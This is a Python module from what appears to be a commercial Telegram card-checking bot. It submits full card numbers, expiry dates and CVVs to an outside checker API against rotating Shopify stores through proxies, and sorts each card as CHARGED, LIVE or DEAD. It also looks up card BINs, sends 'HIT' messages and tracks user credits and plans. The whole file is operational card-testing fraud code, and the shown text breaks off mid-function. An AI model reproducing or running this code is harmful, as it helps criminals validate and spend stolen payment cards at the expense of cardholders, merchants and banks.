# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def _parse_response_field(data: dict) -> str:
    """Extract the human-readable response string from the API JSON.

    shopi.up.railway.app returns:
      {"Status": true/false, "Response": "ORDER_PAID"|"CARD_DECLINED"|...,
       "Gateway": "shopify_payments", "Price": "0.98", "Currency": "USD", ...}

    CRITICAL: Status is authoritative.
      Status=true  → card was CHARGED regardless of what Response says → "ORDER_PAID"
      Status=false → use the Response string to classify LIVE / DEAD / RETRY
    """
    # ── Status=true → charged, full stop ──────────────────────────────────
    if data.get("Status") is True:
        return "ORDER_PAID"

    # ── Status=false → read the Response field ────────────────────────────
    for key in ("Response", "response", "message", "Message",
                "result", "Result", "msg"):
        val = data.get(key)
        if val and isinstance(val, str) and val.strip():
            resp = val.strip()
            # "ERROR" from the API = infrastructure / unknown → RETRY
            if resp.upper() == "ERROR":
                return "site error! status: 500"
            return resp

    # ── No Response field + Status=false → hard decline ──────────────────
    for key in ("error", "Error"):
        val = data.get(key)
        if val and isinstance(val, str) and val.strip():
            return val.strip()

    return "CARD_DECLINED"


def _proxy_url(proxy: Optional[str]) -> Optional[str]:
    """Ensure proxy has http:// prefix as required by the API."""
    if not proxy:
        return None
    p = proxy.strip()
    if p.startswith(("http://", "https://", "socks5://", "socks4://")):
        return p
    return f"http://{p}"


def _normalise_gateway(raw: str) -> str:
    """Normalise gateway name so probe and result code both see the same string.

    API returns "shopify_payments" (lowercase, underscore).
    Internal code (sitechk, classify) compares against "SHOPIFY PAYMENTS".
    """
    cleaned = raw.replace("_", " ").replace("-", " ").strip().upper()
    return cleaned   # → "SHOPIFY PAYMENTS"


async def _call_api(card: str, site: str, proxy: Optional[str],
                    timeout: float = SITE_TIMEOUT) -> tuple:
    """Call the shopi.up.railway.app checker API.

    Endpoint : https://shopi.up.railway.app/shopii
    Method   : GET
    Params   :
        cc    = CARDNUM|MM|YY|CVV   (pipe-separated, all in one param)
        site  = domain.myshopify.com (no https:// prefix)
        proxy = http://ip:port       (optional)

    Response JSON:
        {"CC":..., "Currency":"USD", "Gateway":"shopify_payments",
         "Price":"0.98", "Proxy":"None", "Response":"CARD_DECLINED",
         "Status": false}

    Status is authoritative:
        true  → ORDER_PAID  (CHARGED)
        false → use Response string (LIVE / DEAD / RETRY)

    Rate limiting:
        _get_api_sem() caps simultaneous calls across ALL users to
        API_CONCURRENCY.  Without this, 1000 users × SITE_BATCH would
        send hundreds of simultaneous requests to Railway and trigger
        502/503 responses — hiding real bank results (PCI_ERROR, etc.).
    """
    site_clean = _strip_scheme(site)      # drop any https:// prefix
    # New API (luci.up.railway.app) loads proxies from px.txt server-side
    # automatically — no &proxy= param needed or accepted.
    url = f"{API_URL}?cc={card}&site={site_clean}"

    # Per-user concurrency is controlled by the asyncio.Semaphore(25) in
    # run_mass_batch — each user independently gets 25 concurrent slots.
    # No global semaphore here so one user's 25 slots don't eat into another's.
    # connect=5 → hung proxies fail fast; sock_read=timeout → slow Railway OK
    _to = aiohttp.ClientTimeout(total=timeout, connect=5, sock_read=timeout)
    try:
        async with aiohttp.ClientSession(timeout=_to) as session:
            async with session.get(url, ssl=False) as r:
                http_st = r.status
                raw     = await r.text()

                # Empty body = API couldn't reach the store
                if not raw or not raw.strip():
                    return ("site error! status: 404",
                            "Shopify Payments", "0.00", "USD", http_st)

                if http_st == 200:
                    try:
                        data = _json.loads(raw)
                    except Exception:
                        return ("site error! status: 404",
                                "Shopify Payments", "0.00", "USD", http_st)

                    raw_gw   = str(data.get("Gateway") or data.get("gateway") or "Shopify Payments")
                    gw       = _normalise_gateway(raw_gw)
                    price    = str(data.get("Price")    or data.get("price")    or "0.00")
                    currency = str(data.get("Currency") or data.get("currency") or "USD")
                    api_resp = _parse_response_field(data)

                    logging.info(f"[API] {card[:6]}** {site_clean} "
                                 f"→ {api_resp!r}  gw={gw}  price={price} {currency}")
                    return api_resp, gw, price, currency, http_st

                # Non-200 HTTP from the API server itself
                _emap = {
                    404: "site error! status: 404",
                    403: "site error! status: 403",
                    429: "site error! status: 429",
                    500: "site error! status: 500",
                    502: "site error! status: 502",
                    503: "site error! status: 503",
                    504: "timeout",
                }
                return (_emap.get(http_st, f"site error! status: {http_st}"),
                        "Shopify Payments", "0.00", "USD", http_st)

    except asyncio.TimeoutError:
        return ("timeout", "Shopify Payments", "0.00", "USD", None)
    except asyncio.CancelledError:
        raise
    except Exception as e:
        return (f"connection error: {str(e)[:60]}", "Shopify Payments", "0.00", "USD", None)


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CORE RETRY LOOP
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def _check_card_with_retry(
    _session,
    card: str,
    sites: list,
    proxies: list,
    max_sites: int      = SITE_RETRIES,
    site_timeout: float = SITE_TIMEOUT,
    sid: str            = "",
) -> tuple:
    """
    Try up to max_sites Shopify stores for this card.

    Sites are raced SITE_BATCH at a time — the first definitive bank
    response (CHARGED / TDS / LIVE / DEAD) wins and all other in-flight
    requests are cancelled.  This cuts worst-case time from
    max_sites × timeout  to  ceil(max_sites/SITE_BATCH) × timeout.

    Early-exit: if CONSEC_TIMEOUT_MAX consecutive attempts all time out
    the proxies are clearly dead — return DEAD immediately rather than
    grinding through every remaining site.

    Returns: (verdict, raw_resp, price, currency)
    """
    if not sites:
        sites = get_working_sites()
        if not sites:
            sites = _load_sites()

    local_dead: set = set()
    pool            = list(sites)
    random.shuffle(pool)
    px_pool         = list(proxies) if proxies else list(_ALL_PROXIES)
    tried: set      = set()
    price, currency  = "0.00", "USD"
    last_resp        = "No sites responded"
    consec_timeouts  = 0
    consec_api_errs  = 0    # consecutive API-server 502/503/504 — detects dead API
    attempt          = 0    # total slots consumed

    # ── helpers ───────────────────────────────────────────────────────
    async def _try_one(site: str, proxy: Optional[str]):
        """Wrap _call_api so exceptions become an error-tuple instead of raising."""
        try:
            return site, await _call_api(card, site, proxy, timeout=site_timeout)
        except asyncio.CancelledError:
            raise
        except Exception as e:
            return site, (f"connection error: {str(e)[:60]}",
                          "Shopify Payments", "0.00", "USD", None)

    def _pick_site() -> Optional[str]:
        nonlocal pool
        skip      = tried | local_dead
        available = [s for s in pool if s not in skip]
        if not available:          # exhausted pool once — reset and try again
            local_dead.clear()
            tried.clear()
            pool      = list(sites)
            random.shuffle(pool)
            available = pool[:]
        if not available:
            return None
        s = random.choice(available)
        tried.add(s)
        return s

    # ── main loop — one round = SITE_BATCH parallel attempts ─────────
    while attempt < max_sites:

        # Stop signal (mass check)
        if sid and MSH_SESSIONS.get(sid, {}).get("status") == "STOPPED":
            raise asyncio.CancelledError()

        # Pick up to SITE_BATCH distinct untried sites for this round
        batch: list[str] = []
        for _ in range(min(SITE_BATCH, max_sites - attempt)):
            s = _pick_site()
            if s and s not in batch:
                batch.append(s)
        if not batch:
            break

        attempt += len(batch)

        # Race all sites in the batch simultaneously
        tasks = [
            asyncio.ensure_future(
                _try_one(s, random.choice(px_pool) if px_pool else None)
            )
            for s in batch
        ]

        winner        = None
        batch_timeouts = 0

        try:
            for fut in asyncio.as_completed(tasks):
                try:
                    site, (resp, gw, price, currency, http_st) = await fut
                except asyncio.CancelledError:
                    raise
                except Exception:
                    batch_timeouts += 1
                    continue

                logging.info(f"[API] {card[:6]}** #{attempt}/{max_sites} "
                             f"site={site} → {resp!r}")

                # Timeout → mark dead, tally for early-exit
                if resp == "timeout" or resp == "Timeout":
                    batch_timeouts += 1
                    local_dead.add(site)
                    last_resp = resp
                    continue

                # HTTP-level error from the API server itself (not the Shopify site).
                # 502/503/504 mean the gate API (shopi.up.railway.app) is down —
                # retrying with a different Shopify site won't help.
                if http_st and http_st not in (200,):
                    local_dead.add(site)
                    last_resp = f"HTTP {http_st}"
                    if http_st in (502, 503, 504):
                        consec_api_errs += 1
                    else:
                        consec_api_errs = 0
                    # After 5 consecutive gate-API failures, the API server itself
                    # is down — abort immediately instead of wasting 80 attempts.
                    if consec_api_errs >= 5:
                        logging.error(
                            f"[SH] {card[:6]}** gate API returned HTTP {http_st} "
                            f"{consec_api_errs}× in a row — API server is down, aborting."
                        )
                        return "DEAD", f"Gate API unavailable (HTTP {http_st})", price, currency
                    continue

                consec_api_errs = 0   # reset on any 200

                # Rate-limited → put site back and let next round retry it
                if http_st == 429 or (resp and "status: 429" in resp.lower()):
                    tried.discard(site)
                    continue

                classification = classify_response(resp)
                last_resp      = resp

                logging.info(f"[RESULT] {card[:6]}** #{attempt}/{max_sites} "
                             f"→ {classification}  resp={resp!r}  site={site}")

                if classification in ("CHARGED", "TDS", "LIVE", "DEAD"):
                    winner = (classification, resp, price, currency)
                    break   # cancel remaining in this batch

                # RETRY / ERROR — site gave a non-bank response
                local_dead.add(site)

        except asyncio.CancelledError:
            for t in tasks: t.cancel()
            await asyncio.gather(*tasks, return_exceptions=True)
            raise
        finally:
            # Always cancel any still-running tasks from this batch
            for t in tasks: t.cancel()
            await asyncio.gather(*tasks, return_exceptions=True)

        if winner:
            return winner

        # ── Early-exit on dead proxies ────────────────────────────────
        if batch_timeouts == len(batch):
            consec_timeouts += batch_timeouts
        else:
            consec_timeouts = 0   # a real response resets the counter

        if consec_timeouts >= CONSEC_TIMEOUT_MAX:
            logging.warning(
                f"[SH] {card[:6]}** {consec_timeouts} consecutive timeouts "
                f"({consec_timeouts * site_timeout:.0f}s wasted) — "
                f"aborting early"
            )
            return "DEAD", "timeout", price, currency

        # ── Pace: small delay between rounds to avoid flooding the API ─
        await asyncio.sleep(ROUND_DELAY)

    # ── All attempts exhausted ────────────────────────────────────────
    # If the last real bank response was an ambiguous/unknown one (not a
    # site error), surface it as LIVE rather than silently marking DEAD.
    logging.warning(f"[SH] {card[:6]}** exhausted {max_sites} sites  last={last_resp!r}")
    if last_resp and _is_success_response(last_resp):
        return "LIVE", last_resp, price, currency
    return "DEAD", last_resp, price, currency


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# MISC HELPERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def _te(eid: str, fb: str = "●") -> str:
    """Wrap a custom emoji ID in a <tg-emoji> HTML tag.
    Animates for Telegram Premium users; shows fallback glyph for others.
    Requires parse_mode='HTML' on the containing message."""
    return f'<tg-emoji emoji-id="{eid}">{fb}</tg-emoji>'


def _u16len(s: str) -> int:
    """UTF-16 code-unit length — what Telegram uses for entity offsets."""
    return len(s.encode("utf-16-le")) // 2


def html_to_entities(html: str):
    """
    Convert sh.py-style HTML into (plain_text, entities).

    This is the ONLY reliable way to send custom emoji stickers in PTB.
    Sending <tg-emoji> via parse_mode="HTML" often falls back to the
    plain-text fallback character; injecting MessageEntity objects directly
    guarantees animated premium stickers display for ALL users.

    Handles: <b>  <code>  <a href="...">  <tg-emoji emoji-id="...">
    Decodes: &lt;  &gt;  &amp;  &quot;
    Entities may overlap (e.g. bold + custom_emoji on the same glyph).
    """
    text     = ""
    entities = []
    stack    = []        # [{name, offset, url?}]
    i        = 0
    n        = len(html)

    while i < n:
        ch = html[i]

        # ── HTML tag ────────────────────────────────────────────────────────
        if ch == "<":
            j   = html.index(">", i)
            tag = html[i + 1 : j]

            # Closing tag
            if tag.startswith("/"):
                tag_name = tag[1:].strip().lower()
                for k in range(len(stack) - 1, -1, -1):
                    if stack[k]["name"] == tag_name:
                        entry  = stack.pop(k)
                        start  = entry["offset"]
                        end    = _u16len(text)
                        length = end - start
                        if length > 0:
                            if tag_name == "b":
                                entities.append(MessageEntity(
                                    type="bold", offset=start, length=length))
                            elif tag_name == "code":
                                entities.append(MessageEntity(
                                    type="code", offset=start, length=length))
                            elif tag_name == "a":
                                entities.append(MessageEntity(
                                    type="text_link", offset=start,
                                    length=length, url=entry.get("url", "")))
                        break
                i = j + 1

            # <tg-emoji emoji-id="...">FALLBACK</tg-emoji>  — handled inline
            elif tag.lower().startswith("tg-emoji"):
                m = re.search(r'emoji-id="([^"]+)"', tag)
                if m:
                    emoji_id  = m.group(1)
                    close_idx = html.index("</tg-emoji>", j + 1)
                    fallback  = html[j + 1 : close_idx]
                    offset    = _u16len(text)
                    text     += fallback
                    length    = _u16len(fallback)
                    if length > 0:
                        entities.append(MessageEntity(
                            type="custom_emoji", offset=offset,
                            length=length, custom_emoji_id=emoji_id))
                    i = close_idx + len("</tg-emoji>")
                else:
                    i = j + 1

            # Opening tag
            else:
                tag_name = tag.split()[0].lower() if tag else ""
                entry    = {"name": tag_name, "offset": _u16len(text)}
                if tag_name == "a":
                    m = re.search(r'href=["\']([^"\']+)["\']', tag)
                    if m:
                        entry["url"] = m.group(1)
                stack.append(entry)
                i = j + 1

        # ── HTML entity escapes ─────────────────────────────────────────────
        elif ch == "&":
            if   html[i:i+4] == "&lt;":  text += "<"; i += 4
            elif html[i:i+4] == "&gt;":  text += ">"; i += 4
            elif html[i:i+5] == "&amp;": text += "&"; i += 5
            elif html[i:i+6] == "&quot;":text += '"'; i += 6
            else:                        text += ch;  i += 1

        # ── Plain text ──────────────────────────────────────────────────────
        else:
            text += ch
            i    += 1

    return text, entities if entities else None


def _send_ents(html: str):
    """Return (plain_text, entities_or_None) from an HTML string."""
    return html_to_entities(html)


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# DIRECT MESSAGE ENTITY BUILDER
# Builds Telegram messages with entities directly — ZERO HTML involved.
# This is the only guaranteed way to show animated custom emoji stickers
# for ALL users in python-telegram-bot.  No HTML → entities conversion
# required; MessageEntity objects are injected straight into the API call.
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

class MsgBuilder:
    """Fluent builder that accumulates plain text + MessageEntity objects."""
    __slots__ = ("_txt", "_ents")

    def __init__(self):
        self._txt  = ""
        self._ents = []

    @staticmethod
    def _u16(s: str) -> int:
        """UTF-16 code-unit length — what Telegram uses for entity offsets."""
        return len(s.encode("utf-16-le")) // 2

    # ── primitive appenders ──────────────────────────────────────────────
    def raw(self, s: str) -> "MsgBuilder":
        if s: self._txt += s
        return self

    def bold(self, s: str) -> "MsgBuilder":
        if not s: return self
        o = self._u16(self._txt); l = self._u16(s); self._txt += s
        if l: self._ents.append(MessageEntity(type="bold", offset=o, length=l))
        return self

    def code(self, s: str) -> "MsgBuilder":
        if not s: return self
        o = self._u16(self._txt); l = self._u16(s); self._txt += s
        if l: self._ents.append(MessageEntity(type="code", offset=o, length=l))
        return self

    def link(self, display: str, url: str) -> "MsgBuilder":
        if not display: return self
        o = self._u16(self._txt); l = self._u16(display); self._txt += display
        if l: self._ents.append(MessageEntity(type="text_link", offset=o, length=l, url=url))
        return self

    def emoji(self, eid: str, fb: str) -> "MsgBuilder":
        """Animated custom emoji sticker inline (no bold wrapper)."""
        if not fb: return self
        o = self._u16(self._txt); l = self._u16(fb); self._txt += fb
        if l: self._ents.append(
            MessageEntity(type="custom_emoji", offset=o, length=l, custom_emoji_id=eid))
        return self

    def bold_emoji(self, eid: str, fb: str) -> "MsgBuilder":
        """Bold text + animated custom emoji sticker overlapped on the same glyph."""
        if not fb: return self
        o = self._u16(self._txt); l = self._u16(fb); self._txt += fb
        if l:
            self._ents.append(MessageEntity(type="bold", offset=o, length=l))
            self._ents.append(MessageEntity(
                type="custom_emoji", offset=o, length=l, custom_emoji_id=eid))
        return self

    def bold_link(self, display: str, url: str) -> "MsgBuilder":
        """Bold + hyperlink on the same text."""
        if not display: return self
        o = self._u16(self._txt); l = self._u16(display); self._txt += display
        if l:
            self._ents.append(MessageEntity(type="bold",      offset=o, length=l))
            self._ents.append(MessageEntity(type="text_link", offset=o, length=l, url=url))
        return self

    def italic(self, s: str) -> "MsgBuilder":
        if not s: return self
        o = self._u16(self._txt); l = self._u16(s); self._txt += s
        if l: self._ents.append(MessageEntity(type="italic", offset=o, length=l))
        return self

    def mention(self, username: str) -> "MsgBuilder":
        """@username mention entity."""
        if not username: return self
        o = self._u16(self._txt); l = self._u16(username); self._txt += username
        if l: self._ents.append(MessageEntity(type="mention", offset=o, length=l))
        return self

    def nl(self, n: int = 1) -> "MsgBuilder":
        self._txt += "\n" * n
        return self

    # ── finalise ─────────────────────────────────────────────────────────
    def build(self):
        """Return (plain_text, entities_or_None) ready for send_message/edit_text."""
        return self._txt, self._ents if self._ents else None


def _uname(user) -> str:
    """Plain display name (no HTML)."""
    return getattr(user, "first_name", None) or "User"


def _uurl(user) -> str:
    """Telegram profile URL."""
    if getattr(user, "username", None):
        return f"https://t.me/{user.username}"
    return f"tg://user?id={user.id}"


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# STICKER RESOLVER  —  the ONLY approach that works for ALL
# users regardless of whether the bot has Telegram Premium.
#
# custom_emoji entities in text messages only display as
# animated stickers when the BOT ACCOUNT has Premium.
# Without Premium the fallback glyph (plain "💎") shows instead.
#
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# STICKER / MEDIA HELPERS
#
# Telegram's Bot API rejects custom emoji sticker file_ids from
# every send method (send_sticker, send_animation, send_document …)
# with "Can't parse entities" or "Wrong file type" / "Bad Request".
# The ONLY supported way to display premium animated emoji in bot
# messages is <tg-emoji emoji-id="...">fallback</tg-emoji> inside
# an HTML message.  That tag animates for Premium users and shows
# the fallback glyph for everyone else — no Premium required to read.
#
# All sticker-send code below is therefore reduced to stubs / pure
# send_message wrappers so the codebase compiles unchanged but never
# triggers the Telegram 400 error.
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def _get_sticker_fid(bot, emoji_id: str):
    """Stub — custom emoji sticker file_ids cannot be sent by bots.
    Kept for API compatibility (imported by mst.py). Always returns None."""
    return None


async def _send_sticker(bot, chat_id, emoji_id: str):
    """No-op — custom emoji stickers cannot be sent via any Bot API method.
    Animated emoji display is handled by <tg-emoji> tags in HTML messages."""
    pass


async def _send_as_media(bot, chat_id, emoji_id: str, caption: str,
                          parse_mode: str = "HTML", reply_markup=None,
                          disable_notification: bool = False,
                          reply_to_message_id: int = None):
    """Send a hit notification with a premium custom emoji sticker header.

    Builds the full HTML, then converts it with html_to_entities() so that
    custom_emoji MessageEntity objects are injected DIRECTLY — this guarantees
    animated premium stickers show for ALL users regardless of whether the bot
    account has Telegram Premium.  parse_mode="HTML" alone often falls back to
    the plain-text fallback glyph instead of the animated emoji.
    """
    try:
        if emoji_id:
            full_html = (
                f'<b><tg-emoji emoji-id="{emoji_id}">⭐</tg-emoji></b>\n'
                f'{caption}'
            )
        else:
            full_html = caption

        # Convert HTML → (plain_text, [MessageEntity, ...]) and send with
        # entities= so premium custom_emoji stickers always render animated.
        plain_text, ents = html_to_entities(full_html)

        await bot.send_message(
            chat_id=chat_id,
            text=plain_text,
            entities=ents if ents else None,
            reply_markup=reply_markup,
            disable_web_page_preview=True,
            disable_notification=disable_notification,
            reply_to_message_id=reply_to_message_id,
        )
    except Exception as exc:
        logging.warning(f"[MEDIA] send_message to {chat_id} failed: {exc}")


def _plan_eid(plan: str) -> str:
    norm = "".join(SPECIAL_FONT_MAP.get(c, c.upper()) for c in (plan or ""))
    if norm in PLAN_EMOJIS:
        return PLAN_EMOJIS[norm]
    for k, v in PLAN_EMOJIS.items():
        if k in norm:
            return v
    return PRO_EMOJI_ID


def _user_link(user) -> str:
    name = escape(getattr(user, "first_name", None) or "User")
    if getattr(user, "username", None):
        return f'<a href="https://t.me/{user.username}">{name}</a>'
    return f'<a href="tg://user?id={user.id}">{name}</a>'


def _fmt_time(s: float) -> str:
    s = int(s)
    return f"{s//60}m {s%60}s" if s >= 60 else f"{s}s"


def _fmt_price(price: str, currency: str) -> str:
    try:
        v = float(re.sub(r"[^\d.]", "", price or ""))
        if v > 0:
            return f"{v:.2f} {escape(currency)}"
    except Exception:
        pass
    return "0.00 USD"


def _is_premium(ud: dict, uid: int) -> bool:
    return (uid == OWNER_ID or ud.get("premium", False)
            or ud.get("plan") not in (None, "TRIAL"))


def _get_ud(uid: int, ctx) -> dict:
    """Fetch (or create) user dict from the SAME store as main.py.
    main.py uses bot_data["user_data"][str(uid)] with 150 starter credits.
    Using a different key ("users") meant sh.py always saw an empty dict → 0 credits.
    """
    ud_store = ctx.bot_data.setdefault("user_data", {})
    key      = str(uid)
    if key not in ud_store:
        from datetime import datetime as _dt
        ud_store[key] = {
            "name": "User", "first_name": "User", "last_name": "", "username": "",
            "language_code": "en",
            "joined":      _dt.now().strftime("%Y-%m-%d %H:%M"),
            "last_active": _dt.now().strftime("%Y-%m-%d %H:%M"),
            "credits": 150, "plan": "TRIAL", "expires": 0, "pre_premium_credits": 0,
            "total_refs": 0, "total_checks": 0, "approved_checks": 0,
            "declined_checks": 0, "last_gate": "N/A", "last_card": "N/A",
            "codes_redeemed": 0, "keys_redeemed": 0, "banned": False,
            "total_charged": 0,   # lifetime CHARGED cards
        }
    return ud_store[key]


def _sid() -> str:
    return "".join(random.choices(string.ascii_uppercase + string.digits, k=8))


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# BIN LOOKUP
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
COUNTRY_FLAGS = {
    "US":"🇺🇸","GB":"🇬🇧","CA":"🇨🇦","AU":"🇦🇺","DE":"🇩🇪","FR":"🇫🇷",
    "IN":"🇮🇳","BR":"🇧🇷","MX":"🇲🇽","JP":"🇯🇵","CN":"🇨🇳","RU":"🇷🇺",
    "IT":"🇮🇹","ES":"🇪🇸","NL":"🇳🇱","SE":"🇸🇪","NG":"🇳🇬","ZA":"🇿🇦",
    "EG":"🇪🇬","PK":"🇵🇰","SG":"🇸🇬","MY":"🇲🇾","ID":"🇮🇩","TH":"🇹🇭",
    "PH":"🇵🇭","VN":"🇻🇳","AE":"🇦🇪","SA":"🇸🇦","TR":"🇹🇷","PL":"🇵🇱",
    "UA":"🇺🇦","AR":"🇦🇷","CO":"🇨🇴","CL":"🇨🇱","NZ":"🇳🇿","HK":"🇭🇰",
    "TW":"🇹🇼","KR":"🇰🇷","IL":"🇮🇱","CH":"🇨🇭","BE":"🇧🇪","AT":"🇦🇹",
    "PT":"🇵🇹","GR":"🇬🇷","CZ":"🇨🇿","HU":"🇭🇺","RO":"🇷🇴","FI":"🇫🇮",
    "DK":"🇩🇰","NO":"🇳🇴","IE":"🇮🇪",
}


async def _fetch_bin_direct(bin6: str) -> dict:
    sources = [
        {
            "url":   f"https://data.handyapi.com/bin/{bin6}",
            "hdrs":  {},
            # Real response keys: "Scheme", "Issuer", "Country": {"A2":..,"Name":..}
            "parse": lambda d: {
                "scheme":       (d.get("Scheme") or d.get("scheme") or d.get("Type") or "").upper(),
                "bank":         d.get("Issuer") or d.get("issuer") or d.get("bank") or "",
                "country":      (d.get("Country") or d.get("CountryInfo") or {}).get("Name", ""),
                "country_code": (d.get("Country") or d.get("CountryInfo") or {}).get("A2", ""),
            },
        },
        {
            "url":   f"https://lookup.binlist.net/{bin6}",
            "hdrs":  {"Accept-Version": "3"},
            "parse": lambda d: {
                "scheme":       (d.get("scheme") or d.get("brand") or "").upper(),
                "bank":         (d.get("bank") or {}).get("name", ""),
                "country":      (d.get("country") or {}).get("name", ""),
                "country_code": (d.get("country") or {}).get("alpha2", ""),
            },
        },
        {
            "url":   f"https://api.binin.com/bin/{bin6}",
            "hdrs":  {},
            "parse": lambda d: {
                "scheme":       (d.get("brand") or d.get("scheme") or d.get("type") or "").upper(),
                "bank":         d.get("bank", d.get("issuer", "")),
                "country":      d.get("country", d.get("country_name", "")),
                "country_code": d.get("country_code", d.get("iso2", "")),
            },
        },
        {
            "url":   f"https://api.handy.codes/bin/{bin6}",
            "hdrs":  {},
            "parse": lambda d: {
                "scheme":       (d.get("scheme") or d.get("brand") or d.get("type") or "").upper(),
                "bank":         d.get("bank", ""),
                "country":      d.get("country", ""),
                "country_code": d.get("country_code", d.get("iso", "")),
            },
        },
        {
            "url":   f"https://www.bincodes.com/api/bin/?hash=free&bin={bin6}",
            "hdrs":  {},
            "parse": lambda d: {
                "scheme":       (d.get("card") or d.get("scheme") or "").upper(),
                "bank":         d.get("bank", ""),
                "country":      d.get("country", ""),
                "country_code": d.get("country_code", ""),
            },
        },
    ]
    _to = aiohttp.ClientTimeout(total=10, connect=5)
    for src in sources:
        try:
            async with aiohttp.ClientSession(
                timeout=_to, headers={"User-Agent": "Mozilla/5.0"}
            ) as s:
                async with s.get(src["url"], headers=src["hdrs"], ssl=False) as r:
                    if r.status != 200:
                        continue
                    try:
                        data = await r.json(content_type=None)
                    except Exception:
                        continue
                    info = src["parse"](data)
                    # Require scheme AND at least one of bank/country to be non-empty.
                    # A result with scheme but N/A bank + N/A country is useless — try next source.
                    _bad = {"", "N/A", "NONE", "UNKNOWN", "NULL", "None", "none"}
                    scheme_ok  = bool((info.get("scheme")  or "").strip().upper() not in _bad)
                    bank_ok    = bool((info.get("bank")    or "").strip().upper() not in _bad)
                    country_ok = bool((info.get("country") or "").strip().upper() not in _bad)
                    if not scheme_ok or not (bank_ok or country_ok):
                        continue
                    cc = (info.get("country_code") or "").upper()[:2]
                    # Build flag from alpha2 if not provided by the source
                    if not cc and info.get("country"):
                        cc = ""
                    info["country_emoji"] = COUNTRY_FLAGS.get(cc, "")
                    return info
        except Exception:
            continue
    return {}


def _bin_empty(r: dict) -> bool:
    """True if the result has no usable BIN data (N/A, error, or missing)."""
    if not r or r.get("error"):
        return True
    bad = {"", "N/A", "NONE", "UNKNOWN", "NULL", "None", "none"}
    scheme  = str(r.get("scheme",  "") or "").strip().upper()
    bank    = str(r.get("bank",    "") or "").strip().upper()
    country = str(r.get("country", "") or "").strip().upper()
    # Need scheme AND at least one of bank/country
    scheme_ok  = scheme  not in bad
    bank_ok    = bank    not in bad
    country_ok = country not in bad
    return not scheme_ok or not (bank_ok or country_ok)


async def _bin_lookup(bin6: str) -> dict:
    if bin6 in _BIN_CACHE:
        return _BIN_CACHE[bin6]
    result: dict = {}

    # 1. Try multi-source direct lookup first (fastest, no rate limit)
    try:
        result = await asyncio.wait_for(_fetch_bin_direct(bin6), timeout=10)
    except Exception:
        result = {}

    # 2. Fall back to config.py binlist.net helper if direct failed
    if _bin_empty(result):
        try:
            result = await asyncio.wait_for(get_bin_info(bin6), timeout=8) or {}
        except Exception:
            result = {}

    _BIN_CACHE[bin6] = result
    return result


# ISO-standard long names → clean short names
_COUNTRY_CLEAN = {
    "United States of America (the)":                            "United States",
    "United Kingdom of Great Britain and Northern Ireland (the)":"United Kingdom",
    "Korea (the Republic of)":                                   "South Korea",
    "Korea (the Democratic People's Republic of)":               "North Korea",
    "Russian Federation (the)":                                  "Russia",
    "Iran (Islamic Republic of)":                                "Iran",
    "Taiwan, Province of China":                                 "Taiwan",
    "Hong Kong, Special Administrative Region":                  "Hong Kong",
    "Philippines (the)":                                         "Philippines",
    "Netherlands (the)":                                         "Netherlands",
    "Sudan (the)":                                               "Sudan",
    "Niger (the)":                                               "Niger",
    "Gambia (the)":                                              "Gambia",
    "Bolivia (Plurinational State of)":                          "Bolivia",
    "Venezuela (Bolivarian Republic of)":                        "Venezuela",
    "Tanzania, United Republic of":                              "Tanzania",
    "Moldova (the Republic of)":                                 "Moldova",
    "Syrian Arab Republic (the)":                                "Syria",
    "Lao People's Democratic Republic (the)":                    "Laos",
    "Viet Nam":                                                  "Vietnam",
}

def _clean_country(name: str) -> str:
    return _COUNTRY_CLEAN.get(name, name)


def _bin_str(bd: dict) -> str:
    def _g(*keys):
        for k in keys:
            v = bd.get(k)
            if v and str(v).strip() not in ("", "None", "N/A", "null", "UNKNOWN"):
                return str(v).strip()
        return "N/A"
    scheme  = escape(_g("scheme", "brand", "card_scheme", "network").upper())
    bank    = escape(_g("bank", "bank_name", "issuer", "issuer_name"))
    country = escape(_clean_country(_g("country", "country_name", "country_full")))
    flag    = bd.get("country_emoji", "")
    cstr    = f"{flag} {country}".strip() if flag else country
    return f"{scheme} - {bank} - {cstr}"


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# BIN STRING — plain-text version for MsgBuilder
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def _bin_str_plain(bd: dict) -> str:
    """Like _bin_str but WITHOUT HTML escaping — for use inside MsgBuilder."""
    def _g(*keys):
        for k in keys:
            v = bd.get(k)
            if v and str(v).strip() not in ("", "None", "N/A", "null", "UNKNOWN"):
                return str(v).strip()
        return "N/A"
    scheme  = _g("scheme", "brand", "card_scheme", "network").upper()
    bank    = _g("bank", "bank_name", "issuer", "issuer_name")
    country = _clean_country(_g("country", "country_name", "country_full"))
    flag    = bd.get("country_emoji", "")
    cstr    = f"{flag} {country}".strip() if flag else country
    return f"{scheme} - {bank} - {cstr}"


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# RESULT MESSAGE  — clean UI, matches the target design:
#   HIT ➛ CHARGED 💎
#   Gate ➛ Shopify • 1.99 USD
#   ✅ ORDER_PAID
#   User ➛ @username ⭐
# Animation delivered via _send_as_media() at send time.
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def build_result_msg(card, resp, verdict, bin_data, price, currency,
